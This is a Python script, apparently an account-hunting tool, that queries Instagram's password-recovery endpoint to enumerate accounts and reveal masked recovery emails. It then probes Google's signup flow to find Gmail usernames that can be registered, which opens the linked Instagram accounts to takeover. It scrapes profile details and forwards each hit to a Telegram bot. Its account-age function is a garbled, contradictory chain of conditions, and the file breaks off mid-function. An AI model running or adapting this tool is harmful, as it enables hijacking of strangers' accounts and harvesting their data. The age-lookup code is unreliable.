import requests , webbrowser
from random import randrange,choice
from user_agent import generate_user_agent
import os
import sys
from concurrent.futures import ThreadPoolExecutor
import time
from random import *
import random; import string,json
from re import *
import threading
#— — — — — — — — — — — — —
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#اورق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
W1 = '\x1b[1;97m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = f'\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
#— — — — — — — — — — — — —
GE,BE,GI,BI=0,0,0,0
#— — — — — — — — — — — — —
os.system('clear')
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ; logo = (f"""{C}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{Y}
⠀⠀⠀⠀⠀⠀⠀⠀
                                   @llkbvm.


     


        ██╗           ██████╗       █████╗      ██╗
        ██║          ██╔═══██╗     ██╔══██╗     ██║
        ██║          ██║   ██║     ███████║     ██║
        ██║          ██║   ██║     ██╔══██║     ██║
        ███████╗     ╚██████╔╝     ██║  ██║  ██║
        ╚══════╝      ╚═════╝      ╚═╝  ╚═╝     ╚═╝




⠀⠀⠀⠀⠀⠀⠀
         
{C}§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§{M}
""")
#— — — — — — — — — — — — —
print(logo)
#webbrowser.open('https://t.me/+tiqHjp7lmfw1MDdk')
iid = input(f"{W9} [{W8}●{W9}] {W5}ID : {W8}")
tok = input(f"{W9} [{W8}●{W9}] {W5}TOKEN : {W8}")
#webbrowser.open('https://t.me/+tiqHjp7lmfw1MDdk')
os.system('clear')
#— — — — — — — — — — — — —
def rest(email):
    rre=email.split('@')[0]
    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
    hr={
    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
    'X-Pigeon-Rawclienttime':'1707104597.347',
    'X-IG-Connection-Speed':'-1kbps',
    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
    'X-IG-Bandwidth-TotalBytes-B':'0',
    'X-IG-Bandwidth-TotalTime-MS':'0',
    'X-IG-VP9-Capable':'false',
    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
    'X-IG-Connection-Type':'WIFI',
    'X-IG-Capabilities':'3brTvw==',
    'X-IG-App-ID':'567067343352427',
    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
    'Accept-Language':'ar-IQ, en-US',
    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding':'gzip, deflate',
    'Host':'i.instagram.com',
    'X-FB-HTTP-Engine':'Liger',
    'Connection':'keep-alive',
    'Content-Length':'364',
    }
    dah={
    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{rre}''"}',

    'ig_sig_key_version':'4',
    }
    k=requests.post(uh,headers=hr,data=dah).text
    try:return  k.split('email":"')[1].split('","status":"ok"}')[0]
    except:return False
def date(Id):
 try:
  if int(Id) >1 and int(Id)<1279000:
   return 2010
  elif int(Id)>1279001 and int(Id)<17750000:
   return 2011
  elif int(Id) > 17750001 and int(Id)<279760000:
   return 2012
  elif int(Id) > 106501 and int(Id)<106501:
   return 20100
  elif int(Id) > 194763261 and int(Id)<194763261:
   return 20133
  elif int(Id) > 2240339065 and int(Id)<2240339065:
   return 20155
  elif int(Id) > 4004018889 and int(Id)<4004018889:
   return 20177
  elif int(Id)>279760001 and int(Id)<900990000:
   return 2013
  elif int(Id)>900990001 and int(Id)< 1629010000:
   return 2014
  elif int(Id)>1900000000 and int(Id)<2500000000:
   return 2015
  elif int(Id)>2500000000 and int(Id)<3713668786:
   return 2016
  elif int(Id)>3713668786 and int(Id)<5699785217:
   return 2017
  elif int(Id)>5699785217 and int(Id)<8507940634:
   return 2018
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 2019
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 18
  elif int(Id)>14500000000 and int(Id)<23500000000:
   return 17
  elif int(Id)>3000000000 and int(Id)<4800000000:
   return 16
  elif int(Id)>9700000000 and int(Id)<14500000000:
   return 15
  elif int(Id)>6700000000 and int(Id)<9700000000:
   return 14
  elif int(Id)>4800000000 and int(Id)<6700000000:
   return 13
  elif int(Id)>4943062071 and int(Id)<8507940634:
   return 12
  elif int(Id)>8507940634 and int(Id)<13705588523:
   return 11
  elif int(Id)>8507940634 and int(Id)<21254029834:
   return 10
  elif int(Id)>13705588523 and int(Id)<21254029834:
   return 9
  elif int(Id)>9999999999 and int(Id)<99999999999:
   return 8
  elif int(Id)>8888888888 and int(Id)<88888888888:
   return 7
  elif int(Id)>7777777777 and int(Id)<77777777777:
   return 6
  elif int(Id)>6666666666 and int(Id)<66666666666:
   return 5
  elif int(Id)>5555555555 and int(Id)<55555555555:
   return 4
  elif int(Id)>4444444444 and int(Id)<44444444444:
   return 3
  elif int(Id)>3333333333 and int(Id)<33333333333:
   return 1
  elif int(Id)>2222222222 and int(Id)<22222222222:
   return 2
  elif int(Id)>1111111111 and int(Id)<11111111111:
   return 256
  elif int(Id)>0000000000 and int(Id)<00000000000:
   return 2009
  elif int(Id)>9000000000 and int(Id)<90000000000:
   return 20086
  elif int(Id)>8000000000 and int(Id)<80000000000:
   return 20752
  elif int(Id)>7000000000 and int(Id)<70000000000:
   return 20185
  elif int(Id)>6000000000 and int(Id)<60000000000:
   return 201908
  elif int(Id)>5000000000 and int(Id)<50000000000:
   return 201928
  elif int(Id)>4000000000 and int(Id)<40000000000:
   return 201977
  elif int(Id)>3000000000 and int(Id)<30000000000:
   return 201956
  elif int(Id)>2000000000 and int(Id)<20000000000:
   return 201956
  elif int(Id)>1000000000 and int(Id)<10000000000:
   return 20152
  elif int(Id) > 3000000000 and int(Id)<4800000000:
    return 2016
  elif int(Id) > 4800000000 and int(Id)<6700000000:
    return 2017
  elif int(Id) > 6700000000 and int(Id)<9700000000:
    return 2018
  elif int(Id) > 9700000000 and int(Id)<14500000000:
    return 2019
  elif int(Id) > 14500000000 and int(Id)<23500000000:
    return 2020
  elif int(Id) >10000000 and int(Id)<90000000:
    return 2010
  elif int(Id) > 90000000 and int(Id) < 180000000:
    return 2011
  elif int(Id) > 180000000 and int(Id) <290000000:
    return 2012
  elif int(Id) > 290000000 and int(Id) <450000000:
    return 2013
  elif int(Id) > 450000000 and int(Id) <720000000:
    return 2014
  elif int(Id) > 720000000 and int(Id) <990000000:
    return 2015
  elif int(Id) > 990000000 and int(Id) <1350000000:
    return 2016
  elif int(Id) > 1350000000 and int(Id) <1800000000:
    return 2017
  elif int(Id) > 1800000000 and int(Id) <2300000000:
    return 2018
  elif int(Id) > 2300000000 and int(Id) <2800000000:
    return 2019
  elif int(Id) > 2800000000 and int(Id) <3300000000:
    return 2020
  elif int(Id) > 3300000000 and int(Id) <3700000000:
    return 2021
  elif int(Id) > 3700000000 and int(Id) <4200000000:
    return 2022
  elif int(Id) > 4200000000 and int(Id) <4700000000:
    return 2023
  elif int(Id) > 4700000000 and int(Id) <5200000000:
    return 2024
  elif int(Id) > 5200000000:
    return 2025
  elif int(Id) > 1280000 and int(Id) < 17760000:
    return 2011
  elif int(Id) > 17760001 and int(Id) < 279770000:
    return 2012
  elif int(Id) > 106600 and int(Id) < 106700:
    return 20100
  elif int(Id) > 194763300 and int(Id) < 194763400:
    return 20133
  elif int(Id) > 2240339100 and int(Id) < 2240339200:
    return 20155
  elif int(Id) > 4004018900 and int(Id) < 4004019000:
    return 20177
  elif int(Id) > 279770001 and int(Id) < 900991000:
    return 2013
  elif int(Id) > 900991001 and int(Id) < 1629011000:
    return 2014
  elif int(Id) > 1900000100 and int(Id) < 2500000100:
    return 2015
  elif int(Id) > 2500000100 and int(Id) < 3713668800:
    return 2016
  elif int(Id) > 3713668800 and int(Id) < 5699785300:
    return 2017
  elif int(Id) > 5699785300 and int(Id) < 8507940700:
    return 2018
  elif int(Id) > 8507940700 and int(Id) < 21254029900:
    return 2019
  elif int(Id) > 14500000100 and int(Id) < 23500000100:
    return 2020
  elif int(Id) > 3000000100 and int(Id) < 4800000100:
    return 2016
  elif int(Id) > 4800000100 and int(Id) < 6700000100:
    return 2017
  elif int(Id) > 6700000100 and int(Id) < 9700000100:
    return 2018
  elif int(Id) > 9700000100 and int(Id) < 14500000100:
    return 2019
  elif int(Id) > 10000001 and int(Id) < 90000001:
    return 201066547
  elif int(Id) > 90000001 and int(Id) < 180000001:
    return 20116680
  elif int(Id) > 180000001 and int(Id) < 290000001:
    return 20129654
  elif int(Id) > 290000001 and int(Id) < 450000001:
    return 201335
  elif int(Id) > 450000001 and int(Id) < 720000001:
    return 20140999
  elif int(Id) > 720000001 and int(Id) < 990000001:
    return 20156800
  elif int(Id) > 990000001 and int(Id) < 1350000001:
    return 20169088
  elif int(Id) > 1350000001 and int(Id) < 1800000001:
    return 2017122
  elif int(Id) > 1800000001 and int(Id) < 2300000001:
    return 2018680
  elif int(Id) > 2300000001 and int(Id) < 2800000001:
    return 20193578
  elif int(Id) > 2800000001 and int(Id) < 3300000001:
    return 20206584
  elif int(Id) > 3300000001 and int(Id) < 3700000001:
    return 2021668
  elif int(Id) > 3700000001 and int(Id) < 4200000001:
    return 2022658
  elif int(Id) > 4200000001 and int(Id) < 4700000001:
    return 2023866
  elif int(Id) > 4700000001 and int(Id) < 5200000001:
    return 2024636
  elif int(Id) > 5200000001:
    return 202566
  elif int(Id) > 1000000000 and int(Id) < 1100000000:
    return 8
  elif int(Id) > 1100000000 and int(Id) < 1200000000:
    return 8
  elif int(Id) > 1200000000 and int(Id) < 1300000000:
    return 8
  elif int(Id) > 1300000000 and int(Id) < 1400000000:
    return 8
  elif int(Id) > 1400000000 and int(Id) < 1500000000:
    return 8
  elif int(Id) > 1500000000 and int(Id) < 1600000000:
    return 8
  elif int(Id) > 1600000000 and int(Id) < 1700000000:
    return 8
  elif int(Id) > 1700000000 and int(Id) < 1800000000:
    return 8
  elif int(Id) > 1800000000 and int(Id) < 1900000000:
    return 8
  elif int(Id) > 1900000000 and int(Id) < 2000000000:
    return 8
  elif int(Id) > 2000000000 and int(Id) < 2100000000:
    return 8
  elif int(Id) > 2100000000 and int(Id) < 2200000000:
    return 8
  elif int(Id) > 2200000000 and int(Id) < 2300000000:
    return 8
  elif int(Id) > 2300000000 and int(Id) < 2400000000:
    return 8
  elif int(Id) > 2400000000 and int(Id) < 2500000000:
    return 8
  elif int(Id) > 2500000000 and int(Id) < 2600000000:
    return 8
  elif int(Id) > 2600000000 and int(Id) < 2700000000:
    return 8
  elif int(Id) > 2700000000 and int(Id) < 2800000000:
    return 8
  elif int(Id) > 2800000000 and int(Id) < 2900000000:
    return 8
  elif int(Id) > 2900000000 and int(Id) < 3000000000:
    return 8
  elif int(Id) > 3000000000 and int(Id) < 3100000000:
    return 8
  elif int(Id) > 3100000000 and int(Id) < 3200000000:
    return 8
  elif int(Id) > 3200000000 and int(Id) < 3300000000:
    return 8
  elif int(Id) > 3300000000 and int(Id) < 3400000000:
    return 8
  elif int(Id) > 3400000000 and int(Id) < 3500000000:
    return 8
  elif int(Id) > 3500000000 and int(Id) < 3600000000:
    return 8
  elif int(Id) > 3600000000 and int(Id) < 3700000000:
    return 8
  elif int(Id) > 3700000000 and int(Id) < 3800000000:
    return 8
  elif int(Id) > 3800000000 and int(Id) < 3900000000:
    return 8
  elif int(Id) > 3900000000 and int(Id) < 4000000000:
    return 8
  elif int(Id) > 4000000000 and int(Id) < 4100000000:
    return 8
  elif int(Id) > 4100000000 and int(Id) < 4200000000:
    return 8
  elif int(Id) > 4200000000 and int(Id) < 4300000000:
    return 8
  elif int(Id) > 4300000000 and int(Id) < 4400000000:
    return 8
  elif int(Id) > 4400000000 and int(Id) < 4500000000:
    return 8
  elif int(Id) > 4500000000 and int(Id) < 4600000000:
    return 8
  elif int(Id) > 4600000000 and int(Id) < 4700000000:
    return 8
  elif int(Id) > 4700000000 and int(Id) < 4800000000:
    return 8
  elif int(Id) > 4800000000 and int(Id) < 4900000000:
    return 8
  elif int(Id) > 4900000000 and int(Id) < 5000000000:
    return 8
  elif int(Id) > 5000000000 and int(Id) < 5100000000:
    return 8
  elif int(Id) > 5100000000 and int(Id) < 5200000000:
    return 8
  elif int(Id) > 5200000000 and int(Id) < 5300000000:
    return 8
  elif int(Id) > 5300000000 and int(Id) < 5400000000:
    return 8
  elif int(Id) > 5400000000 and int(Id) < 5500000000:
    return 8
  elif int(Id) > 5500000000 and int(Id) < 5600000000:
    return 8
  elif int(Id) > 5600000000 and int(Id) < 5700000000:
    return 8
  elif int(Id) > 5700000000 and int(Id) < 5800000000:
    return 8
  elif int(Id) > 5800000000 and int(Id) < 5900000000:
    return 8
  elif int(Id) > 5900000000 and int(Id) < 6000000000:
    return 8
  else:
   return "2019-2022"
 except:
        return False
def info(email):
    global iid,tok

    res=rest(email)
    username=email.split("@")[0]
    try:
        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

        response = requests.get(url, headers=headers)

        if response.status_code != 200:
           pass

        data = response.json()
        user = data['data']['user']


        user_info = {
            "username": user["username"],
            "Id":user['id'],
            "full_name": user["full_name"],
            "followers": user["edge_followed_by"]["count"],
            "following": user["edge_follow"]["count"],
            "posts": user["edge_owner_to_timeline_media"]["count"],
            "bio": user["biography"],
            "is_private": user["is_private"],
            "is_verified": user["is_verified"],
            "profile_pic_url": user["profile_pic_url"],
            "Developer ":"https://t.me/ii33cc"
        }
        Id=user_info['Id']
        full_name=user_info['full_name']
        followers=user_info['followers']
        following=user_info['following']
        posts=user_info['posts']
        bio=user_info['bio']
        is_verified=user_info['is_verified']
        is_private=user_info['is_private']
        profile_pic_url=user_info['profile_pic_url']
        cc = username
        resm = res
        if "@" in resm:
        	resm=resm.split('@')[0]
        re = cc[0] == resm[0] and cc[-1] == resm[-1]
        if cc[0] == resm[0] and cc[-1] == resm[-1]:
        	inf=" طلع بيانات صح ✅ "
        else:
        	inf=" طلع بيانات غلط ⛔ "        
        tlg=f'''
— — — — — — — — — — — — —
﴾ Gmail - {email} ﴿
﴾ Reset - {res} ﴿
﴾ Info - {inf} ﴿
— — — — — — — — — — — — —
﴾ اسم🐧 مستخدم - {username} ﴿
﴾ اسم🐧 - {full_name} ﴿
﴾ متابعين🐧 - {followers} ﴿
﴾ متابعهم🐧 - {following} ﴿
﴾ ايدي🐧 - {Id} ﴿
﴾ داتي🐧 - {date(Id)} ﴿
﴾🐧Private -{is_private} ﴿
﴾ 🐧Bio - {bio} ﴿
https://www.instagram.com/{username} ﴿
♕♕♕♕♕♕♕♕♕♕♕♕♕
LO: @m_eeri8
'''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
    except requests.exceptions.RequestException as e:
        tlg=f'''
— — — — — — — — — — — — —
﴾ Gmail - {email} ﴿
﴾ Reset - {res} ﴿
— — — — — — — — — — — — —
﴾ Info - {inf} ﴿
﴾ Info - https://www.instagram.com/{username} ﴿
♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕♕
LO: @m_eeri8
        '''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(tlg))
def hso_gmail(email):
    global GE,BE,GI,BI
    email=email.split("@")[0]
    name = ''.join(choice('abcdefghijklmnopqrstuvwxyz') for i in range(randrange(5,10)))
    birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
    s = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-browser-channel': 'stable',
        'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.',
        'x-browser-year': '2024',
    }

    params = {
        'biz': 'false',
        'continue': 'https://mail.google.com/mail/u/0/',
        'ddm': '1',
        'emr': '1',
        'flowEntry': 'SignUp',
        'flowName': 'GlifWebSignIn',
        'followup': 'https://mail.google.com/mail/u/0/',
        'osid': '1',
        'service': 'mail',
    }

    response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
    tl=response.url.split('TL=')[1]
    s1= response.text.split('"Qzxixc":"')[1].split('"')[0]
    at = response.text.split('"SNlM0e":"')[1].split('"')[0]
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(name,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }

    data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text



    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'"]',
        'x-same-domain': '1',
    }

    params = {
        'rpcids': 'NHJMOd',
        'source-path': '/lifecycle/steps/signup/username',
        'hl': 'en-US',
        'TL': tl,
        'rt': 'c',
    }


    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

    response = s.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        headers=headers,
        data=data,
    ).text
   # print(response)
    if 'password' in response:
        info(email)
        GE+=1
        sys.stdout.write(f'''\r         {S}انتظر- [ {F}صح : {M}{GE}{Z} | غلط: {M}{BE}{X} | لا: {M}{BI}{C}{S} ]'''),sys.stdout.flush()
    else:
        BE+=1
        sys.stdout.write(f'''\r         {S}انتظر [ {F}صح : {M}{GE}{Z} | غلط: {M}{BE}{X} | لا: {M}{BI}{C}{S} ]'''),sys.stdout.flush()
def HSO_to_examine(email):
    global GE,BE,GI,BI
    headers = {
        'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
        'X-Pigeon-Rawclienttime':'1707104597.347',
        'X-IG-Connection-Speed':'-1kbps',
        'X-IG-Bandwidth-Speed-KBPS':'-1.000',
        'X-IG-Bandwidth-TotalBytes-B':'0',
        'X-IG-Bandwidth-TotalTime-MS':'0',
        'X-IG-VP9-Capable':'false',
        'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type':'WIFI',
        'X-IG-Capabilities':'3brTvw==',
        'X-IG-App-ID':'567067343352427',
        'User-Agent':str(generate_user_agent()),
        'Accept-Language':'ar-IQ, en-US',
        'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Host':'i.instagram.com',
        'X-FB-HTTP-Engine':'Liger',
        'Connection':'keep-alive',
        'Content-Length':'364',
    }
    data = {
        'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{email}''"}',

        'ig_sig_key_version':'4',
    }
    try:
        res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
        #print(res)
